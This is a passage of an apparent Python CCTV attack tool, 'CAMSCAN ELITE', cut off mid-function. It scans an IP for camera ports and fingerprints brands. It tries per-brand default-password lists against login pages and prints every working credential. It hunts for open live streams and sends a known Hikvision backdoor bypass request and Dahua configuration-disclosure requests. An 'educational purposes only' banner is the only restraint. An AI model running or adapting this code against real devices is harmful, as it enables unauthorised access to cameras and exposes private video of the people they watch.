#!/usr/bin/env python3
"""
CAMSCAN ELITE - Premium CCTV & IP Camera Reconnaissance Suite
Enterprise-Grade Security Scanner with Advanced Exploitation Detection

Author: Security Research Elite
Version: 5.0.0
License: MIT - For Educational & Research Purposes Only
"""

import asyncio
import aiohttp
import socket
import ssl
import json
import re
import ipaddress
import concurrent.futures
from urllib.parse import urljoin, urlparse, quote
from typing import Dict, List, Optional, Tuple, Any
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import threading
import time
import random
from dataclasses import dataclass
import urllib3
import base64
import hashlib
from xml.etree import ElementTree
import logging
import argparse
import sys
import os
from pathlib import Path
import csv
import xml.etree.ElementTree as ET
from datetime import datetime
import hashlib
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import struct

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure colorful logging
class ColorFormatter(logging.Formatter):
    """Custom formatter for colored console output"""
    grey = "\x1b[38;21m"
    blue = "\x1b[38;5;39m"
    yellow = "\x1b[38;5;226m"
    red = "\x1b[38;5;196m"
    bold_red = "\x1b[31;1m"
    green = "\x1b[38;5;82m"
    reset = "\x1b[0m"

    def __init__(self):
        super().__init__()
        self.FORMATS = {
            logging.DEBUG: self.grey + self._fmt + self.reset,
            logging.INFO: self.blue + self._fmt + self.reset,
            logging.WARNING: self.yellow + self._fmt + self.reset,
            logging.ERROR: self.red + self._fmt + self.reset,
            logging.CRITICAL: self.bold_red + self._fmt + self.reset
        }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

# Setup logging
logger = logging.getLogger(__name__)
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter())
logger.addHandler(console_handler)
logger.setLevel(logging.INFO)

@dataclass
class CameraPort:
    port: int
    protocol: str
    description: str
    common_brands: List[str]

@dataclass
class CameraBrand:
    name: str
    default_credentials: List[Tuple[str, str]]
    common_ports: List[int]
    user_agents: List[str]
    login_patterns: List[str]
    stream_paths: List[str]
    vulnerabilities: List[str]
    exploit_methods: List[str]

@dataclass
class ScanResult:
    ip: str
    port: int
    protocol: str
    service: str
    banner: str
    requires_auth: bool
    camera_brand: str
    model: str
    firmware: str
    login_url: str
    stream_url: str
    credentials: List[Tuple[str, str]]
    location_info: Dict[str, Any]
    vulnerabilities: List[str]
    headers: Dict[str, str]
    response_time: float
    geo_location: Dict[str, Any]
    endpoints: List[str]
    exploit_status: Dict[str, bool]
    risk_score: int

class CamScanElite:
    """
    ENTERPRISE-GRADE CCTV RECONNAISSANCE SUITE
    Advanced detection, exploitation assessment, and security analysis
    """
    
    def __init__(self, max_threads: int = 100, timeout: int = 8, user_agent: str = None, 
                 output_dir: str = "reports", rate_limit: float = 0.05, 
                 enable_exploits: bool = False, deep_scan: bool = False):
        
        self.max_threads = max_threads
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.output_dir = Path(output_dir)
        self.rate_limit = rate_limit
        self.enable_exploits = enable_exploits
        self.deep_scan = deep_scan
        
        # Create output directory
        self.output_dir.mkdir(exist_ok=True)
        
        # Initialize components
        self.camera_ports = self._initialize_ports()
        self.camera_brands = self._initialize_brands()
        self.session = self._create_session()
        
        # Progress tracking
        self.scanned_ports = 0
        self.total_ports = 0
        self.found_cameras = []
        self.lock = threading.Lock()
        self.start_time = time.time()
        
        # Statistics
        self.stats = {
            'ports_scanned': 0,
            'cameras_found': 0,
            'credentials_found': 0,
            'vulnerabilities_found': 0,
            'streams_detected': 0
        }
    
    def _initialize_ports(self) -> List[CameraPort]:
        """Initialize comprehensive port database"""
        base_ports = [
            # Standard Web Ports
            CameraPort(80, "http", "Standard HTTP", ["All Brands"]),
            CameraPort(443, "https", "Standard HTTPS", ["All Brands"]),
            CameraPort(8080, "http", "Alternative HTTP", ["Hikvision", "Dahua", "Axis"]),
            CameraPort(8443, "https", "Alternative HTTPS", ["Hikvision", "Dahua"]),
            CameraPort(8000, "http", "Common CCTV HTTP", ["Hikvision", "Dahua", "CP Plus"]),
            CameraPort(8081, "http", "Web Interface", ["Various"]),
            CameraPort(8082, "http", "Web Interface", ["Various"]),
            CameraPort(8088, "http", "Web Interface", ["Various"]),
            CameraPort(8888, "http", "Web Interface", ["Various"]),
            
            # RTSP Ports
            CameraPort(554, "rtsp", "Standard RTSP", ["All Brands"]),
            CameraPort(5554, "rtsp", "Alternative RTSP", ["Hikvision", "Dahua"]),
            CameraPort(8554, "rtsp", "Alternative RTSP", ["Various"]),
            CameraPort(10554, "rtsp", "High RTSP", ["Various"]),
            
            # Specialized Ports
            CameraPort(81, "http", "Alternative Web", ["Dahua", "Hikvision"]),
            CameraPort(82, "http", "Alternative Web", ["Various"]),
            CameraPort(83, "http", "Alternative Web", ["Various"]),
            CameraPort(84, "http", "Alternative Web", ["Various"]),
            CameraPort(85, "http", "Alternative Web", ["Various"]),
            
            # DVR/NVR Ports
            CameraPort(37777, "tcp", "Dahua DVR", ["Dahua"]),
            CameraPort(37778, "tcp", "Dahua Mobile", ["Dahua"]),
            CameraPort(34567, "tcp", "Hikvision DVR", ["Hikvision"]),
            CameraPort(34568, "tcp", "Hikvision DVR", ["Hikvision"]),
            CameraPort(34569, "tcp", "Hikvision DVR", ["Hikvision"]),
            CameraPort(6036, "tcp", "CP Plus DVR", ["CP Plus"]),
            
            # ONVIF Ports
            CameraPort(3702, "onvif", "ONVIF Discovery", ["All ONVIF Compliant"]),
            CameraPort(5353, "onvif", "ONVIF mDNS", ["All ONVIF Compliant"]),
        ]
        
        # Add high ports for comprehensive scanning
        high_ports = [9000, 9001, 10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009]
        for port in high_ports:
            base_ports.append(CameraPort(port, "http", f"High HTTP {port}", ["Various"]))
                
        return base_ports
    
    def _initialize_brands(self) -> Dict[str, CameraBrand]:
        """Initialize comprehensive camera brand database with exploits"""
        return {
            "Hikvision": CameraBrand(
                name="Hikvision",
                default_credentials=[
                    ("admin", "12345"), ("admin", "123456"), ("admin", "1234567"),
                    ("admin", "12345678"), ("admin", "123456789"), ("admin", "1234567890"),
                    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
                    ("admin", "111111"), ("admin", "888888"), ("admin", "666666"),
                    ("admin", "hikvision"), ("admin", "Hikvision123"), ("", ""),
                    ("admin", "Admin123"), ("admin", "Hik12345")
                ],
                common_ports=[80, 443, 8000, 8080, 554, 34567, 34568, 34569],
                user_agents=["Hikvision", "Hik-Webs", "NetVideo"],
                login_patterns=[
                    r"hikvision", r"Hikvision", r"Web Video Server",
                    r"HIKVISION", r"IPCamera", r"NetVideo"
                ],
                stream_paths=[
                    "/ISAPI/Streaming/channels/101", "/Streaming/Channels/101",
                    "/onvif/device_service", "/rtsp/1", "/img/snapshot.cgi",
                    "/axis-cgi/mjpg/video.cgi", "/mjpg/video.mjpg"
                ],
                vulnerabilities=[
                    "CVE-2017-7921 - Backdoor Authentication Bypass",
                    "CVE-2021-36260 - Command Injection", 
                    "CVE-2022-28171 - Firmware Update Vulnerability",
                    "Default Credentials Vulnerability"
                ],
                exploit_methods=[
                    "Backdoor URL Access", "Command Injection", "Firmware Manipulation"
                ]
            ),
            "Dahua": CameraBrand(
                name="Dahua",
                default_credentials=[
                    ("admin", "admin"), ("admin", "123456"), ("admin", "12345"),
                    ("admin", "1234"), ("admin", "111111"), ("admin", "666666"),
                    ("admin", "888888"), ("admin", "admin123"), ("admin", "password"),
                    ("admin", "dahua"), ("admin", "Dahua123"), ("admin", "Dahua2021"),
                    ("admin", "Dahua2022"), ("admin", "Dahua2023"), ("admin", "Dahua2024"),
                    ("", ""), ("admin", "Admin123"), ("admin", "Dahua123!")
                ],
                common_ports=[80, 443, 8080, 37777, 37778, 554],
                user_agents=["Dahua", "DHI-WEB", "WebService", "DMSS"],
                login_patterns=[
                    r"dahua", r"Dahua", r"DHIP", r"Web Service", 
                    r"IPCamera", r"SmartPSS", r"DMSS"
                ],
                stream_paths=[
                    "/cam/realmonitor", "/cgi-bin/realmonitor", 
                    "/onvif/device_service", "/rtsp/1", "/video.mjpg",
                    "/mjpg/video.mjpg", "/axis-cgi/mjpg/video.cgi"
                ],
                vulnerabilities=[
                    "CVE-2021-33044 - Authentication Bypass",
                    "CVE-2022-30563 - OS Command Injection", 
                    "CVE-2023-23333 - Firmware Vulnerability",
                    "Default Credentials Vulnerability"
                ],
                exploit_methods=[
                    "Authentication Bypass", "Command Injection", "Firmware Exploit"
                ]
            ),
            "Axis": CameraBrand(
                name="Axis",
                default_credentials=[
                    ("root", "pass"), ("root", "admin"), ("admin", "admin"),
                    ("root", ""), ("admin", "password"), ("root", "root"),
                    ("axis", "axis"), ("admin", "1234"), ("root", "1234")
                ],
                common_ports=[80, 443, 8080, 554],
                user_agents=["Axis", "AXIS", "Network Camera", "Video Server"],
                login_patterns=[
                    r"Axis", r"AXIS", r"Network Camera", 
                    r"Video Server", r"Companion"
                ],
                stream_paths=[
                    "/axis-cgi/mjpg/video.cgi", "/axis-media/media.amp",
                    "/onvif/device_service", "/rtsp/1", "/mjpg/video.mjpg",
                    "/video.mjpg", "/img/snapshot.cgi"
                ],
                vulnerabilities=[
                    "CVE-2018-10660 - Buffer Overflow",
                    "CVE-2022-31247 - Authentication Bypass",
                    "Default Credentials Vulnerability"
                ],
                exploit_methods=["Buffer Overflow", "Auth Bypass"]
            ),
            "CP Plus": CameraBrand(
                name="CP Plus",
                default_credentials=[
                    ("admin", "admin"), ("admin", "123456"), ("admin", "1234"),
                    ("admin", "111111"), ("admin", "888888"), ("admin", "666666"),
                    ("admin", "cpplus"), ("admin", "CPPlus"), ("admin", "CPPlus123"),
                    ("admin", "CPPlus@123"), ("admin", "cplus"), ("admin", "admin123"),
                    ("", ""), ("admin", "password"), ("admin", "cpadmin")
                ],
                common_ports=[80, 443, 8000, 6036, 554],
                user_agents=["CP Plus", "CPPLUS", "WebService", "Security Management System"],
                login_patterns=[
                    r"CP Plus", r"CPPLUS", r"Security Management System",
                    r"CPS", r"CP-UVR", r"CP-DVR", r"CP-NVR"
                ],
                stream_paths=[
                    "/streaming/channels/1", "/live.sdp", 
                    "/onvif/device_service", "/media.amp", "/video.mjpg",
                    "/mjpg/video.mjpg", "/axis-cgi/mjpg/video.cgi"
                ],
                vulnerabilities=[
                    "Default Credentials Vulnerability",
                    "Information Disclosure Vulnerability",
                    "Firmware Vulnerability"
                ],
                exploit_methods=["Info Disclosure", "Default Creds"]
            ),
            "Generic": CameraBrand(
                name="Generic",
                default_credentials=[
                    ("admin", "admin"), ("admin", "1234"), ("admin", "12345"),
                    ("admin", "123456"), ("admin", "password"), ("admin", ""),
                    ("root", "root"), ("root", "admin"), ("admin", "1111"),
                    ("admin", "111111"), ("admin", "888888"), ("admin", "666666"),
                    ("user", "user"), ("guest", "guest"), ("operator", "operator"),
                    ("supervisor", "supervisor"), ("", ""), ("admin", "Admin123")
                ],
                common_ports=[80, 443, 8080, 554, 1935],
                user_agents=[],
                login_patterns=[
                    r"login", r"Login", r"LOGIN", r"password", 
                    r"Password", r"IP Camera", r"Web Service", r"Webcam"
                ],
                stream_paths=[
                    "/video", "/stream", "/live", "/media", 
                    "/cam", "/camera", "/onvif/device_service",
                    "/axis-cgi/mjpg/video.cgi", "/mjpg/video.mjpg",
                    "/video.mjpg", "/img/snapshot.cgi"
                ],
                vulnerabilities=["Default Credentials Vulnerability"],
                exploit_methods=["Default Credentials"]
            )
        }
    
    def _create_session(self) -> requests.Session:
        """Create robust HTTP session with advanced retry strategy"""
        session = requests.Session()
        
        # Advanced retry strategy
        retry_strategy = Retry(
            total=5,
            backoff_factor=0.5,
            status_forcelist=[408, 429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS"]
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy, 
            pool_connections=200, 
            pool_maxsize=200
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        
        return session
    
    def print_banner(self):
        """Display professional banner"""
        banner = f"""
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║                           CAMSCAN ELITE v5.0.0                               ║
    ║                 Premium CCTV Reconnaissance & Security Suite                ║
    ║                                                                              ║
    ║  🔍 Advanced Camera Detection  🔑 Credential Testing  🛡️  Vulnerability Scan  ║
    ║  📹 Live Stream Discovery      🌍 Geolocation         📊 Risk Assessment     ║
    ║                                                                              ║
    ║                      For Educational & Research Purposes Only               ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    
    [*] Threads: {self.max_threads} | Timeout: {self.timeout}s | Deep Scan: {self.deep_scan}
    [*] Rate Limit: {self.rate_limit}s | Exploits: {self.enable_exploits}
        """
        print(banner)
    
    async def scan_ip(self, target_ip: str, custom_ports: List[int] = None) -> List[ScanResult]:
        """
        Advanced IP scanning with comprehensive analysis
        """
        logger.info(f"🚀 Initiating elite scan on {target_ip}")
        
        # Validate IP address
        if not self._validate_ip(target_ip):
            logger.error(f"❌ Invalid IP address: {target_ip}")
            return []
        
        # Determine ports to scan
        ports_to_scan = [cp.port for cp in self.camera_ports]
        if custom_ports:
            ports_to_scan.extend(custom_ports)
        
        # Remove duplicates and sort
        ports_to_scan = sorted(set(ports_to_scan))
        self.total_ports = len(ports_to_scan)
        self.scanned_ports = 0
        self.found_cameras = []
        
        logger.info(f"🎯 Scanning {self.total_ports} ports on {target_ip}")
        print(f"[*] Scanning comprehensive CCTV ports on IP: {target_ip}")
        print(f"[*] This will scan {self.total_ports} ports. This may take a while...")
        
        # Multi-threaded port scanning with progress
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(self._check_port, target_ip, port): port 
                for port in ports_to_scan
            }
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        with self.lock:
                            self.found_cameras.append(result)
                            self.stats['cameras_found'] += 1
                    time.sleep(self.rate_limit)
                except Exception as e:
                    port = futures[future]
                    logger.debug(f"Error scanning port {port}: {e}")
        
        # Enhanced analysis
        enhanced_results = []
        if self.found_cameras:
            print(f"\n[*] Scan completed: {self.scanned_ports} ports checked, {len(self.found_cameras)} ports open")
            print(f"\n[*] Analyzing Ports for Camera Indicators:")
            
            for result in self.found_cameras:
                enhanced_result = await self._enhance_scan_result(result)
                enhanced_results.append(enhanced_result)
        
        logger.info(f"✅ Scan completed. Found {len(enhanced_results)} camera services")
        return enhanced_results
    
    def _validate_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def _check_port(self, ip: str, port: int) -> Optional[ScanResult]:
        """Advanced port checking with detailed analysis"""
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            response_time = time.time() - start_time
            sock.close()
            
            if result == 0:
                print(f"    Port {port} OPEN!")
                logger.info(f"🔍 Port {port} is open on {ip} (Response: {response_time:.2f}s)")
                return self._analyze_service(ip, port, response_time)
        
        except Exception as e:
            logger.debug(f"Error checking port {port}: {e}")
        
        self.scanned_ports += 1
        self._print_progress()
        return None
    
    def _analyze_service(self, ip: str, port: int, response_time: float) -> Optional[ScanResult]:
        """Comprehensive service analysis"""
        try:
            protocol = "http"
            if port == 443 or port == 8443:
                protocol = "https"
            
            base_url = f"{protocol}://{ip}:{port}"
            start_time = time.time()
            
            # Advanced HTTP analysis
            response = self.session.get(base_url, timeout=self.timeout, verify=False, allow_redirects=True)
            total_response_time = time.time() - start_time
            
            if response.status_code in [200, 301, 302, 401, 403]:
                print(f"\n[*] Analyzing Port {port} ({protocol.upper()}):")
                
                # Camera detection
                camera_brand = self._identify_camera_brand(response.text, response.headers, response.url)
                requires_auth = self._check_authentication(response)
                model = self._extract_model(response.text)
                firmware = self._extract_firmware(response.text, response.headers)
                
                result = ScanResult(
                    ip=ip,
                    port=port,
                    protocol=protocol,
                    service="HTTP/HTTPS",
                    banner=response.headers.get('Server', 'Unknown'),
                    requires_auth=requires_auth,
                    camera_brand=camera_brand,
                    model=model,
                    firmware=firmware,
                    login_url=response.url,
                    stream_url="",
                    credentials=[],
                    location_info={},
                    vulnerabilities=[],
                    headers=dict(response.headers),
                    response_time=total_response_time,
                    geo_location={},
                    endpoints=[],
                    exploit_status={},
                    risk_score=0
                )
                
                # Enhanced camera detection
                if camera_brand != "Unknown" or self._is_camera_interface(response.text):
                    print(f"  [-] Camera Endpoint Found: {response.url} (HTTP {response.status_code})")
                    print(f"  [-] Status Code: {response.status_code}")
                    return result
                else:
                    # Check for redirects to camera pages
                    if self._check_camera_redirect(response):
                        print(f"  [-] Redirect to Camera Interface: {response.url}")
                        return result
            
            # RTSP detection
            if self._check_rtsp(ip, port):
                print(f"\n[*] Analyzing Port {port} (RTSP):")
                print(f"  [-] RTSP Stream Found: rtsp://{ip}:{port}/")
                return ScanResult(
                    ip=ip,
                    port=port,
                    protocol="rtsp",
                    service="RTSP Stream",
                    banner="RTSP Server",
                    requires_auth=False,
                    camera_brand="Unknown",
                    model="",
                    firmware="",
                    login_url="",
                    stream_url=f"rtsp://{ip}:{port}/",
                    credentials=[],
                    location_info={},
                    vulnerabilities=[],
                    headers={},
                    response_time=response_time,
                    geo_location={},
                    endpoints=[],
                    exploit_status={},
                    risk_score=0
                )
                
        except requests.RequestException as e:
            logger.debug(f"HTTP analysis failed for {ip}:{port}: {e}")
        except Exception as e:
            logger.error(f"Unexpected error analyzing {ip}:{port}: {e}")
        
        self.scanned_ports += 1
        self._print_progress()
        return None
    
    def _identify_camera_brand(self, html_content: str, headers: Dict, url: str) -> str:
        """Advanced camera brand identification"""
        html_lower = html_content.lower()
        url_lower = url.lower()
        
        for brand_name, brand_data in self.camera_brands.items():
            # Check HTML content
            for pattern in brand_data.login_patterns:
                if re.search(pattern, html_content, re.IGNORECASE):
                    return brand_name
            
            # Check headers
            server_header = headers.get('Server', '').lower()
            for user_agent in brand_data.user_agents:
                if user_agent.lower() in server_header:
                    return brand_name
            
            # Check URL patterns
            if any(pattern.lower() in url_lower for pattern in brand_data.login_patterns):
                return brand_name
        
        return "Unknown"
    
    def _is_camera_interface(self, html_content: str) -> bool:
        """Advanced camera interface detection"""
        camera_indicators = [
            r'camera', r'video', r'stream', r'surveillance', r'security',
            r'ip camera', r'web service', r'live view', r'realtime',
            r'ptz', r'pan', r'tilt', r'zoom', r'motion detection',
            r'recording', r'playback', r'configuration', r'setup'
        ]
        
        html_lower = html_content.lower()
        matches = sum(1 for indicator in camera_indicators if re.search(indicator, html_lower))
        
        return matches >= 2
    
    def _check_authentication(self, response) -> bool:
        """Advanced authentication detection"""
        auth_indicators = [
            response.status_code == 401,
            response.status_code == 403,
            'login' in response.url.lower(),
            'password' in response.text.lower(),
            'authentication' in response.text.lower(),
            '401' in response.text,
            '403' in response.text,
            'unauthorized' in response.text.lower()
        ]
        
        return any(auth_indicators)
    
    def _check_rtsp(self, ip: str, port: int) -> bool:
        """RTSP service detection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            
            request = f"OPTIONS rtsp://{ip}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            sock.send(request.encode())
            
            response = sock.recv(1024).decode()
            sock.close()
            
            return 'RTSP' in response or 'rtsp' in response
            
        except Exception:
            return False
    
    def _check_camera_redirect(self, response) -> bool:
        """Check if response redirects to camera interface"""
        redirect_indicators = [
            'index.shtml' in response.url,
            'view.shtml' in response.url,
            'live.shtml' in response.url,
            'video.shtml' in response.url,
            'webcam' in response.url,
            'camera' in response.url
        ]
        return any(redirect_indicators)
    
    def _extract_model(self, html_content: str) -> str:
        """Extract camera model from content"""
        model_patterns = [
            r'model[:\s]*([^\s<>\"]+)',
            r'product[:\s]*([^\s<>\"]+)',
            r'device[:\s]*([^\s<>\"]+)',
            r'camera[:\s]*([^\s<>\"]+)',
            r'<title>([^<]+)</title>',
            r'model\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'product\s*=\s*[\'"]([^\'"]+)[\'"]'
        ]
        
        for pattern in model_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        
        return "Unknown"
    
    def _extract_firmware(self, html_content: str, headers: Dict) -> str:
        """Extract firmware version"""
        firmware_patterns = [
            r'firmware[:\s]*([^\s<>\"]+)',
            r'version[:\s]*([^\s<>\"]+)',
            r'fw[:\s]*([^\s<>\"]+)',
            r'v[:\s]*([^\s<>\"]+)'
        ]
        
        for pattern in firmware_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        
        # Check headers
        server_header = headers.get('Server', '')
        if 'firmware' in server_header.lower():
            return server_header
        
        return "Unknown"
    
    async def _enhance_scan_result(self, result: ScanResult) -> ScanResult:
        """Comprehensive result enhancement"""
        print(f"\n[*] Scanning for Camera Type & Firmware:")
        print(f"  [-] Checking {result.login_url}...")
        
        try:
            # Get location information
            result.location_info = await self._get_ip_location(result.ip)
            result.geo_location = await self._get_geolocation(result.ip)
            
            # Enhanced brand detection
            if result.camera_brand == "Unknown":
                result.camera_brand = await self._deep_brand_detection(result)
                if result.camera_brand == "Unknown":
                    print("  [-] Unknown Camera Type:")
                    print("  [-] Attempting Generic Fingerprint...")
            
            # Authentication analysis
            print(f"[*] Checking for authentication pages:")
            if result.requires_auth:
                print(f"  [-] Found login page: {result.login_url} (HTTP 200)")
                print(f"  [-] Found 1 authentication pages")
                
                # Credential testing
                print(f"[*] Testing common credentials:")
                result.credentials = await self._test_default_credentials(result)
                if result.credentials:
                    self.stats['credentials_found'] += len(result.credentials)
            
            # Stream detection
            print(f"[*] Checking for Live Streams:")
            result.stream_url = await self._find_stream_urls(result)
            if "No streams" not in result.stream_url:
                self.stats['streams_detected'] += 1
            
            # Vulnerability assessment
            result.vulnerabilities = await self._check_vulnerabilities(result)
            if result.vulnerabilities:
                self.stats['vulnerabilities_found'] += len(result.vulnerabilities)
            
            # Endpoint discovery
            result.endpoints = await self._discover_endpoints(result)
            
            # Risk assessment
            result.risk_score = self._calculate_risk_score(result)
            
            # Exploit testing
            if self.enable_exploits:
                result.exploit_status = await self._test_exploits(result)
            
        except Exception as e:
            logger.error(f"Error enhancing result: {e}")
        
        return result
    
    async def _deep_brand_detection(self, result: ScanResult) -> str:
        """Deep brand detection using multiple methods"""
        try:
            # Check common endpoints
            endpoints = [
                "/view/index.shtml", "/webcam.html", "/video.html",
                "/live.html", "/camera.html", "/admin.html"
            ]
            
            for endpoint in endpoints:
                url = f"{result.protocol}://{result.ip}:{result.port}{endpoint}"
                try:
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        brand = self._identify_camera_brand(response.text, response.headers, response.url)
                        if brand != "Unknown":
                            return brand
                except:
                    continue
            
            # Check for common camera HTML patterns
            response = self.session.get(result.login_url, timeout=5, verify=False)
            content = response.text.lower()
            
            if any(pattern in content for pattern in ['axis', 'axiscgi']):
                return "Axis"
            elif any(pattern in content for pattern in ['hikvision', 'netvideo']):
                return "Hikvision"
            elif any(pattern in content for pattern in ['dahua', 'dhip']):
                return "Dahua"
            elif any(pattern in content for pattern in ['cp plus', 'cpplus']):
                return "CP Plus"
                
        except Exception as e:
            logger.debug(f"Deep brand detection failed: {e}")
        
        return "Unknown"
    
    async def _test_default_credentials(self, result: ScanResult) -> List[Tuple[str, str]]:
        """Advanced credential testing with multiple methods"""
        working_credentials = []
        brand = self.camera_brands.get(result.camera_brand, self.camera_brands["Generic"])
        
        for username, password in brand.default_credentials:
            if await self._try_login(result.login_url, username, password):
                working_credentials.append((username, password))
                print(f"    Success: {username}:{password} @ {result.login_url}")
                # Don't break, continue to find all working credentials
        
        return working_credentials
    
    async def _try_login(self, login_url: str, username: str, password: str) -> bool:
        """Advanced login testing with multiple methods"""
        try:
            # Method 1: Basic Auth
            response = self.session.get(login_url, auth=(username, password), 
                                      timeout=self.timeout, verify=False)
            if response.status_code == 200 and not self._check_authentication(response):
                return True
            
            # Method 2: Form-based login
            login_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password,
                'login': 'Login',
                'submit': 'Submit',
                'Login': 'Login'
            }
            
            response = self.session.post(login_url, data=login_data, 
                                       timeout=self.timeout, verify=False)
            if response.status_code == 200 and not self._check_authentication(response):
                return True
            
            # Method 3: Check for successful redirect
            if response.status_code in [301, 302]:
                location = response.headers.get('Location', '')
                if 'main' in location.lower() or 'live' in location.lower() or 'video' in location.lower():
                    return True
                    
        except Exception:
            pass
        
        return False
    
    async def _find_stream_urls(self, result: ScanResult) -> str:
        """Advanced stream URL discovery"""
        stream_urls = []
        brand = self.camera_brands.get(result.camera_brand, self.camera_brands["Generic"])
        
        # Test brand-specific streams
        for path in brand.stream_paths:
            stream_url = f"{result.protocol}://{result.ip}:{result.port}{path}"
            if await self._test_stream_url(stream_url):
                stream_urls.append(stream_url)
                print(f"  [-] Potential Stream: {stream_url}")
        
        # Test generic streams
        generic_paths = [
            "/axis-cgi/mjpg/video.cgi", "/mjpg/video.mjpg", "/video.mjpg",
            "/img/snapshot.cgi", "/snapshot.jpg", "/live.jpg", "/video.jpg"
        ]
        
        for path in generic_paths:
            stream_url = f"{result.protocol}://{result.ip}:{result.port}{path}"
            if await self._test_stream_url(stream_url):
                if stream_url not in stream_urls:
                    stream_urls.append(stream_url)
                    print(f"  [-] Potential Stream: {stream_url}")
        
        return ", ".join(stream_urls) if stream_urls else "No streams found"
    
    async def _test_stream_url(self, url: str) -> bool:
        """Test if URL provides a video stream"""
        try:
            response = self.session.get(url, timeout=5, verify=False, stream=True)
            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '').lower()
                
                # Check for video content types
                video_indicators = [
                    'video', 'mjpg', 'mpeg', 'stream', 'multipart',
                    'image/jpeg', 'image/jpg'
                ]
                
                if any(indicator in content_type for indicator in video_indicators):
                    print(f"  [-] Content-Type: {content_type}")
                    return True
                
                # Check for MJPG streams
                if 'boundary' in content_type:
                    print(f"  [-] Content-Type: {content_type}")
                    return True
                    
        except Exception:
            pass
        
        return False
    
    async def _check_vulnerabilities(self, result: ScanResult) -> List[str]:
        """Comprehensive vulnerability assessment"""
        vulnerabilities = []
        brand = self.camera_brands.get(result.camera_brand, self.camera_brands["Generic"])
        
        # Add brand-specific vulnerabilities
        vulnerabilities.extend(brand.vulnerabilities)
        
        # Security checks
        if not result.requires_auth:
            vulnerabilities.append("🔓 Unauthenticated Access - No login required")
        
        if result.credentials:
            vulnerabilities.append("🔑 Default Credentials - Factory passwords in use")
        
        if any(cred for cred in result.credentials if not cred[0] or not cred[1]):
            vulnerabilities.append("🚨 Empty Credentials Accepted - Critical security issue")
        
        # Check for specific CVEs
        if result.camera_brand == "Hikvision":
            if await self._check_hikvision_backdoor(result):
                vulnerabilities.append("🚨 CVE-2017-7921 - Backdoor Authentication Bypass (Confirmed)")
        
        if result.camera_brand == "Dahua":
            if await self._check_dahua_vulnerabilities(result):
                vulnerabilities.append("🚨 CVE-2021-33044 - Authentication Bypass (Potential)")
        
        return vulnerabilities
    
    async def _check_hikvision_backdoor(self, result: ScanResult) -> bool:
        """Check Hikvision backdoor vulnerability"""
        try:
            backdoor_urls = [
                f"{result.protocol}://{result.ip}:{result.port}/Security/users?auth=YWRtaW46MTEK",
                f"{result.protocol}://{result.ip}:{result.port}/System/configurationFile?auth=YWRtaW46MTEK"
            ]
            
            for url in backdoor_urls:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    return True
        except:
            pass
        
        return False
    
    async def _check_dahua_vulnerabilities(self, result: ScanResult) -> bool:
        """Check Dahua vulnerabilities"""
        try:
            # Check for information disclosure
            test_urls = [
                f"{result.protocol}://{result.ip}:{result.port}/cgi-bin/configManager.cgi?action=getConfig&name=General",
                f"{result.protocol}://{result.ip}:{result.port}/cgi-bin/magicBox.cgi?action=getSystemInfo"
            ]
            
            for url in test_urls:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200 and len(response.text) > 10:
                    return True
        except:
            pass
        
        return False
    
    async def _discover_endpoints(self, result: ScanResult) -> List[str]:
        """Discover additional camera endpoints"""
        endpoints = []
        common_endpoints = [
            "/", "/admin", "/login", "/view", "/live", "/video",
            "/config", "/system", "/network", "/security",
            "/snapshot", "/stream", "/media", "/cgi-bin"
        ]
        
        for endpoint in common_endpoints:
            url = f"{result.protocol}://{result.ip}:{result.port}{endpoint}"
            try:
                response = self.session.get(url, timeout=3, verify=False)
                if response.status_code in [200, 301, 302]:
                    endpoints.append(f"{endpoint} (HTTP {response.status_code})")
            except:
                continue
        
        return endpoints
    
    async def _test_exploits(self, result: ScanResult) -> Dict[str, bool]:
        """Test available exploits (educational purposes only)"""
        exploits = {}
        
        if result.camera_brand == "Hikvision":
            exploits['backdoor_auth'] = await self._check_hikvision_backdoor(result)
        
        return exploits
    
    def _calculate_risk_score(self, result: ScanResult) -> int:
        """Calculate security risk score (0-100)"""
        score = 0
        
        # Authentication factors
        if not result.requires_auth:
            score += 40
        elif result.credentials:
            score += 30
        
        # Vulnerability factors
        score += min(30, len(result.vulnerabilities) * 5)
        
